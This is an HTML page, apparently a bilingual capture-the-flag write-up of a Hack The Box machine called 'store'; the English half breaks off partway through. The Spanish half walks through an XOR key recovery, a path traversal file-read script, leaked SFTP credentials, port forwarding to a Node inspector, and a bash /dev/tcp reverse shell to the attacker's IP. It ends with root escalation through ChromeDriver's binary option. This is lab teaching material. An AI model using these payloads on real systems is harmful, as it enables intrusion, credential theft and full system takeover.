@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>store | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">store</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ========== SPANISH ========== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>La máquina expone tres instancias idénticas de una aplicación web Node.js/Express en los puertos 5000, 5001 y 5002. La aplicación permite subir archivos y servirlos cifrados. Aprovechando que ambas versiones del archivo —en claro y cifrada— son accesibles, aplico un ataque <em>two-time pad</em> sobre el cifrado de flujo XOR para recuperar la clave secreta <code>Hm9zeWC38</code>.</p>
+
+                    <p>Con la clave en mano y un path traversal descubierto en la ruta <code>/file/</code>, construyo un script que descifra cualquier archivo del sistema a través de la API. Leyendo <code>/proc/self/environ</code> y <code>.env</code> descubro que el proceso Node se lanza con la flag <code>--inspect</code> en <code>localhost:9229</code>, y que existe un usuario <code>sftpuser</code> con credenciales en el fichero de entorno.</p>
+
+                    <p>Como <code>AllowTcpForwarding</code> no está deshabilitado en la configuración SSH del usuario SFTP, hago un port forward del puerto 9229 hacia mi máquina. Conecto con Chrome DevTools, obtengo una consola Node con ejecución de código y lanzo una reverse shell como <code>dev</code>.</p>
+
+                    <p>Una vez dentro, localizo un proceso <code>chromedriver</code> corriendo como <code>root</code> y escuchando en <code>localhost:9515</code>. Abusando de la opción <code>binary</code> de la API de ChromeDriver para apuntar a un script propio, consigo que root ejecute ese script, el cual asigna el bit SUID a <code>/bin/bash</code>. Finalmente, <code>bash -p</code> me otorga una shell root.</p>
+
+                    <p><strong>Técnicas:</strong> Ataque two-time pad sobre cifrado de flujo XOR, path traversal con URL encoding, lectura de variables de entorno vía <code>/proc/self/environ</code>, port forwarding SSH con usuario SFTP enjaulado, RCE mediante Node.js <code>--inspect</code>, escalada de privilegios abusando de ChromeDriver 9515 para ejecutar código como root.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento inicial</h2>
+                <p>Comienzo con un escaneo nmap para identificar los puertos y servicios expuestos:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#a6e22e">PORT</span>      <span style="color:#a6e22e">STATE</span>  <span style="color:#a6e22e">SERVICE</span>  <span style="color:#a6e22e">VERSION</span>
+<span style="color:#66d9ef">22/tcp</span>    open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 30:68:b8:a8:f5:47:ca:bf:1a:23:97:d5:4c:77:97:da (ECDSA)
+|_  256 3f:83:9f:53:0a:49:db:00:d5:18:85:e9:2f:05:76:dd (ED25519)
+<span style="color:#66d9ef">5000/tcp</span>  open   http     Node.js (Express middleware)
+|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
+<span style="color:#66d9ef">5001/tcp</span>  open   http     Node.js (Express middleware)
+|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
+<span style="color:#66d9ef">5002/tcp</span>  open   http     Node.js (Express middleware)
+|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>
+
+                <p>Los tres puertos (5000, 5001 y 5002) sirven la misma aplicación web. <code>whatweb</code> confirma que se trata de un backend Express sobre Node.js:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">whatweb</span> http://10.129.238.32:5000/
+<span style="color:#75715e"># http://10.129.238.32:5000/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5,
+# IP[10.129.238.32], Title[Secure Encrypted Storage - 01001101 01101001 01101100 ...],
+# X-Powered-By[Express]</span></code></pre>
+
+                <h2>Enumeración Web</h2>
+                <p>Fuzzeo la aplicación para descubrir rutas disponibles:</p>
+
+                <pre><code class="language-plaintext">css     (Status: 301) [Size: 173] [--> /css/]
+upload  (Status: 200) [Size: 807]
+images  (Status: 301) [Size: 179] [--> /images/]
+tmp     (Status: 301) [Size: 173] [--> /tmp/]
+list    (Status: 200) [Size: 589]</code></pre>
+
+                <p>Los directorios <code>/images/</code> y <code>/tmp/</code> redirigen a un 404, pero la ruta <code>/tmp</code> no es estándar y resulta interesante. Al subir una imagen puedo acceder a ella bajo <code>/file/nombre.jpg</code>. Probando distintas rutas descubro que la misma ruta bajo <code>/tmp/</code> devuelve el archivo pero con algún tipo de encoding o cifrado, coherente con el mensaje de la página de inicio: <em>"We store all your data with military grade encryption!"</em></p>
+
+                <h2>Descubrimiento del Path Traversal</h2>
+                <p>Fuzzeo el endpoint <code>/file/</code> con un diccionario de payloads LFI y descubro que el path traversal funciona con <code>/</code> en URL encoding (<code>%2F</code>):</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">feroxbuster</span> -u http://10.129.238.32:5000/file/ \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -s 200
+
+<span style="color:#75715e"># 200 GET http://10.129.238.32:5000/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span></code></pre>
+
+                <p>El archivo existe pero está cifrado, como el resto de ficheros que sirve la aplicación:</p>
+
+                <img src="./media/image2.png" alt="Respuesta de la aplicación mostrando el contenido de /etc/passwd cifrado al acceder mediante path traversal" />
+
+                <h2>Análisis Criptográfico — Ataque Two-Time Pad</h2>
+                <p>Para entender el cifrado, subo un archivo <code>xd.txt</code> con el contenido <code>tengo un archivo</code> (16 bytes) y descargo su versión cifrada desde <code>/tmp/xd.txt</code>. Los dos archivos tienen exactamente el mismo tamaño:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">wc</span> -c xd.txt
+<span style="color:#ae81ff">16</span> xd.txt
+<span style="color:#66d9ef">wc</span> -c xd_enc.txt
+<span style="color:#ae81ff">16</span> xd_enc.txt</code></pre>
+
+                <p>Esto indica que es un <strong>cifrado de flujo</strong>: un método de criptografía simétrica que cifra los datos byte a byte (o bit a bit), frecuentemente empleado por su simplicidad y velocidad. En un cifrado de flujo el ciphertext se genera así:</p>
+
+                <pre><code class="language-plaintext">Ciphertext = Plaintext XOR Keystream</code></pre>
+
+                <p>XOR es una operación lógica que devuelve <code>1</code> cuando los bits de entrada son distintos y <code>0</code> cuando son iguales, de modo que es trivialmente reversible aplicándola de nuevo:</p>
+
+                <pre><code class="language-plaintext">A  B  XOR
+0  0   0
+0  1   1
+1  0   1
+1  1   0</code></pre>
+
+                <p>Si el keystream se reutiliza entre diferentes archivos (es decir, no se usa un nonce por fichero), se puede recuperar directamente con:</p>
+
+                <pre><code class="language-plaintext">Keystream = Ciphertext XOR Plaintext</code></pre>
+
+                <p>Esto se conoce como ataque <strong>two-time pad</strong>. Escribo un pequeño script para calcularlo:</p>
+
+                <pre><code class="language-python"><span style="color:#f92672">with</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">'xd.txt'</span>, <span style="color:#e6db74">'rb'</span>) <span style="color:#f92672">as</span> f:
+    plaintext <span style="color:#f92672">=</span> f.read()
+
+<span style="color:#f92672">with</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">'xd_enc.txt'</span>, <span style="color:#e6db74">'rb'</span>) <span style="color:#f92672">as</span> f:
+    encrypted <span style="color:#f92672">=</span> f.read()
+
+keystream <span style="color:#f92672">=</span> []
+<span style="color:#f92672">for</span> c, p <span style="color:#f92672">in</span> <span style="color:#a6e22e">zip</span>(encrypted, plaintext):
+    keystream.append(c <span style="color:#f92672">^</span> p)   <span style="color:#75715e"># ^ es el operador XOR en Python</span>
+
+<span style="color:#a6e22e">print</span>(keystream[:<span style="color:#ae81ff">100</span>])</code></pre>
+
+                <p>La función <code>zip</code> empareja los bytes de ambos archivos como los dientes de una cremallera (no tiene nada que ver con archivos <code>.zip</code>). El resultado revela la repetición del keystream:</p>
+
+                <img src="./media/image4.png" alt="Salida del script mostrando los valores del keystream con la repetición visible cada 9 bytes" />
+
+                <p>Aunque el archivo es corto, se aprecia que los primeros 9 valores se repiten, lo que indica que la longitud de la clave es 9. Extraigo su valor real:</p>
+
+                <pre><code class="language-python">key_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>
+key <span style="color:#f92672">=</span> <span style="color:#e6db74">''</span>.join(<span style="color:#a6e22e">chr</span>(x) <span style="color:#f92672">for</span> x <span style="color:#f92672">in</span> keystream[:key_length])
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">"Key:"</span>, key)
+<span style="color:#75715e"># Key: Hm9zeWC38</span></code></pre>
+
+                <h2>Script de Descifrado — LFI Automatizado</h2>
+                <p>Con la clave recuperada, amplío el script para descifrar cualquier archivo del sistema a través del path traversal. Cada request recupera el contenido en base64 embebido en la respuesta HTML, lo decodifica y aplica XOR byte a byte contra la clave cíclica:</p>
+
+                <pre><code class="language-python"><span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> re
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> cycle
+
+<span style="color:#f92672">if</span> <span style="color:#a6e22e">len</span>(sys.argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">f"usage: {sys.argv[0]} &lt;path&gt;"</span>)
+    sys.exit()
+
+encoded_path <span style="color:#f92672">=</span> sys.argv[<span style="color:#ae81ff">1</span>].replace(<span style="color:#e6db74">'/'</span>, <span style="color:#e6db74">'%2f'</span>)
+
+<span style="color:#f92672">try</span>:
+    resp <span style="color:#f92672">=</span> requests.get(
+        <span style="color:#e6db74">f'http://10.129.238.32:5000/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F{encoded_path}'</span>,
+        timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>
+    )
+    enc_b64 <span style="color:#f92672">=</span> re.search(
+        <span style="color:#e6db74">r'data:application/octet-stream;charset=utf-8;base64,(.+?)"'</span>,
+        resp.text
+    ).group(<span style="color:#ae81ff">1</span>)
+<span style="color:#f92672">except</span>:
+    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">'file does not exist'</span>)
+    sys.exit()
+
+enc <span style="color:#f92672">=</span> base64.b64decode(enc_b64)
+pt <span style="color:#f92672">=</span> <span style="color:#e6db74">''</span>.join(<span style="color:#a6e22e">chr</span>(e <span style="color:#f92672">^</span> k) <span style="color:#f92672">for</span> e, k <span style="color:#f92672">in</span> <span style="color:#a6e22e">zip</span>(enc, <span style="color:#a6e22e">cycle</span>(<span style="color:#e6db74">b"Hm9zeWC38"</span>)))
+<span style="color:#a6e22e">print</span>(pt)</code></pre>
+
+                <p>Si el archivo no existe, el request expira por timeout en lugar de devolver respuesta, así que lo detecto con el bloque <code>except</code>. Verifico el funcionamiento leyendo <code>/etc/passwd</code>, donde confirmo los usuarios <code>dev</code> y <code>ubuntu</code>.</p>
+
+                <h2>Recolección de Información — Variables de Entorno y Código Fuente</h2>
+                <p>Leo <code>/proc/self/environ</code> para conocer el entorno del proceso web:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">python3</span> xd.py /proc/self/environ | <span style="color:#66d9ef">tr</span> <span style="color:#e6db74">'\00'</span> <span style="color:#e6db74">'\n'</span></code></pre>
+
+                <pre><code class="language-plaintext">USER=dev
+npm_config_user_agent=npm/8.5.1 node/v12.22.9 linux x64 workspaces/false
+npm_node_execpath=/usr/bin/node
+HOME=/home/dev
+npm_package_json=/home/dev/projects/store1/package.json
+npm_config_local_prefix=/home/dev/projects/store1
+SYSTEMD_EXEC_PID=879
+npm_lifecycle_script=nodemon --exec 'node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js'
+NODE=/usr/bin/node
+LANG=C.UTF-8
+PWD=/home/dev/projects/store1
+SHELL=/bin/bash
+EDITOR=vi
+...</code></pre>
+
+                <p>Hay dos datos críticos aquí. El proceso se lanza con la flag <code>--inspect=127.0.0.1:9229</code>, lo que expone un servicio de debugging de Node.js que permite ejecución de código arbitrario. Por ahora solo escucha en localhost, pero eso cambiará pronto. Adicionalmente, la ruta del proyecto es <code>/home/dev/projects/store1</code>.</p>
+
+                <p>Verifico también el cmdline del proceso:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">python3</span> xd.py /proc/self/cmdline</code></pre>
+
+                <pre><code class="language-plaintext">node--inspect=127.0.0.1:9229/home/dev/projects/store1/start.js</code></pre>
+
+                <p>Leo el fichero <code>.env</code> del proyecto para obtener configuración adicional:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">python3</span> xd.py /home/dev/projects/store1/.env</code></pre>
+
+                <pre><code class="language-plaintext">SFTP_URL=sftp://sftpuser:WidK52pWBtWQdcVC@localhost
+SECRET=Hm9zeWC38
+STORE_HOME=/home/dev/projects/store1
+PORT=5000</code></pre>
+
+                <p>El fichero de entorno confirma la clave que ya había extraído (<code>Hm9zeWC38</code>) y revela las credenciales de un usuario SFTP: <code>sftpuser:WidK52pWBtWQdcVC</code>.</p>
+
+                <h2>Acceso SFTP y Análisis de la Jaula SSH</h2>
+                <p>SFTP usa el puerto 22 y ofrece un acceso similar a FTP. Me conecto con las credenciales encontradas:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">sftp</span> sftpuser@10.129.238.32</code></pre>
+
+                <pre><code class="language-plaintext">Connected to 10.129.238.32.
+sftp> ls
+files
+sftp> cd files
+sftp> ls -lah
+drwxr-xr-x ? 1002 1002 4.0K Mar 11 18:10 .
+drwxr-xr-x ?    0    0 4.0K Feb 13  2023 ..
+-rw-rw-rw- ? 1002 1002  16B Mar 11 18:10 xd.txt</code></pre>
+
+                <p>Estoy enjaulado dentro del directorio <code>files</code> y no puedo salir. Leo la configuración del servidor SSH para entender exactamente cómo está montada la jaula:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">python3</span> xd.py /etc/ssh/sshd_config</code></pre>
+
+                <pre><code class="language-plaintext">Match User sftpuser
+    ForceCommand internal-sftp
+    PasswordAuthentication yes
+    ChrootDirectory /var/sftp
+    AllowAgentForwarding no
+    X11Forwarding no</code></pre>
+
+                <p>La configuración es bastante restrictiva, pero hay un ajuste clave que <strong>no está deshabilitado</strong>: <code>AllowTcpForwarding</code>. Por defecto su valor es <code>yes</code>, lo que significa que aunque este usuario no puede abrir una shell, sí puede hacer port forwarding TCP.</p>
+
+                <h2>Port Forwarding y Acceso al Inspector de Node.js</h2>
+                <p>Aprovecho que <code>AllowTcpForwarding</code> está activo para redirigir el puerto 9229 (Node Inspector) hacia mi máquina local. Como la shell de <code>sftpuser</code> es <code>/bin/false</code>, uso la flag <code>-N</code> para evitar que se ejecute ningún comando:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">ssh</span> sftpuser@10.129.238.32 -N -L 9229:127.0.0.1:9229
+<span style="color:#75715e"># (uso 127.0.0.1 en lugar de localhost para evitar problemas de resolución DNS)</span></code></pre>
+
+                <p>El proceso queda en espera y el puerto 9229 ya está abierto en mi máquina:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  0  128  127.0.0.1:9229</code></pre>
+
+                <p>Para interactuar con el inspector, abro Chrome y navego a <code>chrome://inspect</code>:</p>
+
+                <img src="./media/image3.png" alt="Página chrome://inspect mostrando el proceso Node.js remoto disponible para inspección" />
+
+                <p>Al hacer clic en <em>inspect</em>, se abre una instancia de Chrome DevTools conectada al proceso Node.js remoto. Desde la consola puedo ejecutar código JavaScript como el usuario <code>dev</code>:</p>
+
+                <img src="./media/image1.png" alt="Consola de Chrome DevTools conectada al inspector Node.js del servidor, lista para ejecutar comandos" />
+
+                <h2>Acceso Inicial — RCE mediante Node Inspector</h2>
+                <p>Con una sesión de netcat en escucha en el puerto 443, ejecuto el siguiente payload en la consola del inspector para obtener una reverse shell:</p>
+
+                <pre><code class="language-javascript">require(<span style="color:#e6db74">'child_process'</span>).execSync(
+    <span style="color:#e6db74">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.142/443 0&gt;&amp;1"'</span>
+).toString()</code></pre>
+
+                <p>Consigo una shell como el usuario <code>dev</code>.</p>
+
+                <h2>Escalada de Privilegios — ChromeDriver 9515 RCE como Root</h2>
+                <p>Investigo los puertos locales y los procesos en ejecución. Llama la atención un servicio escuchando en el puerto 9515:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  0  5  127.0.0.1:9515</code></pre>
+
+                <p>Lo crítico es que lo ejecuta <code>root</code>:</p>
+
+                <pre><code class="language-plaintext">root  729  0.0  0.3  33628800  14208  ?  Ssl  17:56  0:00  /root/chromedriver</code></pre>
+
+                <p>El puerto 9515 corresponde a la API de <strong>ChromeDriver</strong>, una herramienta que permite controlar un navegador Chrome de forma programática (habitualmente usada para testing). Verifico que está accesible y listo:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">curl</span> localhost:9515/status</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#f92672">"value"</span>: {
+    <span style="color:#f92672">"build"</span>: { <span style="color:#f92672">"version"</span>: <span style="color:#e6db74">"110.0.5481.77 (...)"</span> },
+    <span style="color:#f92672">"message"</span>: <span style="color:#e6db74">"ChromeDriver ready for new sessions."</span>,
+    <span style="color:#f92672">"ready"</span>: <span style="color:#66d9ef">true</span>
+  }
+}</code></pre>
+
+                <p>Creo una sesión headless de Chrome a través de la API:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">curl</span> -X POST http://localhost:9515/session \
+  -H <span style="color:#e6db74">"Content-Type: application/json"</span> \
+  -d <span style="color:#e6db74">'{"desiredCapabilities":{"browserName":"chrome","chromeOptions":{"args":["--headless","--no-sandbox","--disable-dev-shm-usage"]}}}'</span></code></pre>
+
+                <p>Pruebo a leer archivos privilegiados navegando a URLs <code>file://</code> y consultando el source de la página. Por ejemplo, obtengo el contenido de <code>/etc/shadow</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#75715e"># Navegar al archivo</span>
+<span style="color:#66d9ef">curl</span> -X POST http://localhost:9515/session/&lt;SESSION_ID&gt;/url \
+  -d <span style="color:#e6db74">'{"url":"file:///etc/shadow"}'</span>
+
+<span style="color:#75715e"># Leer el source</span>
+<span style="color:#66d9ef">curl</span> http://localhost:9515/session/&lt;SESSION_ID&gt;/source</code></pre>
+
+                <p>El resultado contiene el contenido completo de <code>/etc/shadow</code> con los hashes de las contraseñas de todos los usuarios del sistema. También aparece un puerto adicional abierto asociado a la instancia del navegador, que permite navegar por el sistema de ficheros de forma visual:</p>
+
+                <img src="./media/image6.png" alt="Navegador Chrome headless mostrando el sistema de ficheros de root accesible a través de la sesión ChromeDriver" />
+
+                <p>La carpeta <code>/root/.ssh/</code> está vacía, así que no puedo colocar directamente una clave SSH. Sin embargo, encuentro un vector más directo. Según <a href="https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148">este artículo de Knownsec 404 Team</a>, la API de ChromeDriver permite especificar un binario alternativo como "navegador" a través de la opción <code>binary</code> en las capacidades de la sesión. Si apunto ese campo a un script propio, ChromeDriver (corriendo como root) lo ejecutará:</p>
+
+                <img src="./media/image5.png" alt="Artículo de Knownsec 404 Team explicando la técnica de RCE mediante la opción binary de ChromeDriver" />
+
+                <p>Creo un script que asigna el bit SUID a <code>/bin/bash</code> y le doy permisos de ejecución:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">cat</span> /tmp/xd.sh
+<span style="color:#75715e">#!/bin/bash
+chmod u+s /bin/bash</span>
+
+<span style="color:#66d9ef">chmod</span> +x /tmp/xd.sh</code></pre>
+
+                <p>Ahora llamo al endpoint de creación de sesión apuntando <code>binary</code> a mi script:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">curl</span> localhost:9515/session \
+  -d <span style="color:#e6db74">'{"capabilities": {"alwaysMatch": {"goog:chromeOptions": {"binary": "/tmp/xd.sh"}}}}'</span></code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#f92672">"value"</span>: {
+    <span style="color:#f92672">"error"</span>: <span style="color:#e6db74">"unknown error"</span>,
+    <span style="color:#f92672">"message"</span>: <span style="color:#e6db74">"unknown error: Chrome failed to start: exited normally.\n (unknown error: DevToolsActivePort file doesn't exist)\n (The process started from chrome location /tmp/xd.sh is no longer running, so ChromeDriver is assuming that Chrome has crashed.)"</span>
+  }
+}</code></pre>
+
+                <p>ChromeDriver devuelve un error porque el script no es un navegador real, pero eso no importa: el script ya se ejecutó con privilegios de root. Verifico el resultado:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">ls</span> -lah /bin/bash
+<span style="color:#ae81ff">-rwsr-xr-x</span> 1 root root 1.4M Mar 14 2024 /bin/bash</code></pre>
+
+                <p>El bit SUID está asignado. Con <code>bash -p</code> obtengo una shell con privilegios de root y accedo a la flag del sistema.</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">bash</span> -p
+<span style="color:#75715e"># bash-5.1# whoami
+# root</span></code></pre>
+
+            </div>
+
+            <!-- ========== ENGLISH ========== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The machine exposes three identical Node.js/Express web application instances on ports 5000, 5001, and 5002. The application allows file uploads and serves them back in an encrypted form. Since both the plaintext and encrypted versions of an uploaded file are accessible, I apply a <em>two-time pad</em> attack against the XOR stream cipher to recover the secret key <code>Hm9zeWC38</code>.</p>
+
+                    <p>With the key in hand and a path traversal vulnerability discovered in the <code>/file/</code> endpoint, I build a script that decrypts any file on the server via the API. Reading <code>/proc/self/environ</code> and the project's <code>.env</code> file, I discover that the Node process runs with the <code>--inspect</code> flag on <code>localhost:9229</code>, and that an <code>sftpuser</code> account has its credentials embedded in the environment file.</p>
+
+                    <p>Since <code>AllowTcpForwarding</code> is not disabled in the SSH configuration for the SFTP user, I port-forward port 9229 to my machine. Connecting with Chrome DevTools gives me a Node.js console with code execution capability, from which I launch a reverse shell as <code>dev</code>.</p>
+
+                    <p>Once inside, I find a <code>chromedriver</code> process running as <code>root</code> and listening on <code>localhost:9515</code>. By abusing the <code>binary</code> option of the ChromeDriver session API to point to a custom script, I make root execute it. The script sets the SUID bit on <code>/bin/bash</code>, and <code>bash -p</code> gives me a root shell.</p>
+
+                    <p><strong>Techniques:</strong> Two-time pad attack on XOR stream cipher, URL-encoded path traversal, environment variable leakage via <code>/proc/self/environ</code>, SSH TCP port forwarding through a jailed SFTP user, RCE via Node.js <code>--inspect</code>, privilege escalation by abusing ChromeDriver 9515 to execute code as root.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#a6e22e">PORT</span>      <span style="color:#a6e22e">STATE</span>  <span style="color:#a6e22e">SERVICE</span>  <span style="color:#a6e22e">VERSION</span>
+<span style="color:#66d9ef">22/tcp</span>    open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 30:68:b8:a8:f5:47:ca:bf:1a:23:97:d5:4c:77:97:da (ECDSA)
+|_  256 3f:83:9f:53:0a:49:db:00:d5:18:85:e9:2f:05:76:dd (ED25519)
+<span style="color:#66d9ef">5000/tcp</span>  open   http     Node.js (Express middleware)
+|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
+<span style="color:#66d9ef">5001/tcp</span>  open   http     Node.js (Express middleware)
+|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
+<span style="color:#66d9ef">5002/tcp</span>  open   http     Node.js (Express middleware)
+|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>
+
+                <p>All three ports serve the same application. <code>whatweb</code> confirms it is an Express backend on Node.js:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">whatweb</span> http://10.129.238.32:5000/
+<span style="color:#75715e"># http://10.129.238.32:5000/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5,
+# IP[10.129.238.32], Title[Secure Encrypted Storage - 01001101 01101001 ...],
+# X-Powered-By[Express]</span></code></pre>
+
+                <h2>Web Enumeration</h2>
+                <p>Fuzzing the application reveals the available routes:</p>
+
+                <pre><code class="language-plaintext">css     (Status: 301) [Size: 173] [--> /css/]
+upload  (Status: 200) [Size: 807]
+images  (Status: 301) [Size: 179] [--> /images/]
+tmp     (Status: 301) [Size: 173] [--> /tmp/]
+list    (Status: 200) [Size: 589]</code></pre>
+
+                <p>Both <code>/images/</code> and <code>/tmp/</code> redirect to 404, but the non-standard <code>/tmp</code> path is interesting. Uploaded files are served under <code>/file/filename</code>, but accessing the same filename under <code>/tmp/</code> returns the file with some kind of encoding or encryption — consistent with the homepage's claim: <em>"We store all your data with military grade encryption!"</em></p>
+
+                <h2>Path Traversal Discovery</h2>
+                <p>Fuzzing <code>/file/</code> with an LFI wordlist reveals that path traversal works with URL-encoded forward slashes (<code>%2F</code>):</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">feroxbuster</span> -u http://10.129.238.32:5000/file/ \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -s 200
+
+<span style="color:#75715e"># 200 GET http://10.129.238.32:5000/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span></code></pre>
+
+                <p>The file exists but its content is encrypted, just like everything else the app serves:</p>
+
+                <img src="./media/image2.png" alt="Application response showing the encrypted contents of /etc/passwd accessed via path traversal" />
+
+                <h2>Cryptographic Analysis — Two-Time Pad Attack</h2>
+                <p>To understand the cipher, I upload a file <code>xd.txt</code> containing <code>tengo un archivo</code> (16 bytes) and download its encrypted version from <code>/tmp/xd.txt</code>. Both files are exactly the same size:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">wc</span> -c xd.txt
+<span style="color:#ae81ff">16</span> xd.txt
+<span style="color:#66d9ef">wc</span> -c xd_enc.txt
+<span style="color:#ae81ff">16</span> xd_enc.txt</code></pre>
+
+                <p>Equal size means this is a <strong>stream cipher</strong>: a symmetric encryption method that operates byte by byte, valued for its simplicity and speed. A stream cipher works like this:</p>
+
+                <pre><code class="language-plaintext">Ciphertext = Plaintext XOR Keystream</code></pre>
+
+                <p>XOR is a logical operation that returns <code>1</code> when the input bits differ and <code>0</code> when they match, making it trivially reversible by applying XOR again:</p>
+
+                <pre><code class="language-plaintext">A  B  XOR
+0  0   0
+0  1   1
+1  0   1
+1  1   0</code></pre>
+
+                <p>If the keystream is reused across different files (i.e., no per-file nonce is used), the keystream can be recovered directly with:</p>
+
+                <pre><code class="language-plaintext">Keystream = Ciphertext XOR Plaintext</code></pre>
+
+                <p>This is a <strong>two-time pad</strong> attack. I write a short script to compute it:</p>
+
+                <pre><code class="language-python"><span style="color:#f92672">with</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">'xd.txt'</span>, <span style="color:#e6db74">'rb'</span>) <span style="color:#f92672">as</span> f:
+    plaintext <span style="color:#f92672">=</span> f.read()
+
+<span style="color:#f92672">with</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">'xd_enc.txt'</span>, <span style="color:#e6db74">'rb'</span>) <span style="color:#f92672">as</span> f:
+    encrypted <span style="color:#f92672">=</span> f.read()
+
+keystream <span style="color:#f92672">=</span> []
+<span style="color:#f92672">for</span> c, p <span style="color:#f92672">in</span> <span style="color:#a6e22e">zip</span>(encrypted, plaintext):
+    keystream.append(c <span style="color:#f92672">^</span> p)   <span style="color:#75715e"># ^ is Python's XOR operator</span>
+
+<span style="color:#a6e22e">print</span>(keystream[:<span style="color:#ae81ff">100</span>])</code></pre>
+
+                <p><code>zip</code> pairs bytes from both files like zipper teeth (unrelated to <code>.zip</code> archives). The output reveals the keystream repetition:</p>
+
+                <img src="./media/image4.png" alt="Script output showing the keystream values with visible repetition every 9 bytes" />
+
+                <p>Even with a short file, the first 9 values clearly repeat, indicating a key length of 9. I extract the actual key:</p>
+
+                <pre><code class="language-python">key_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>
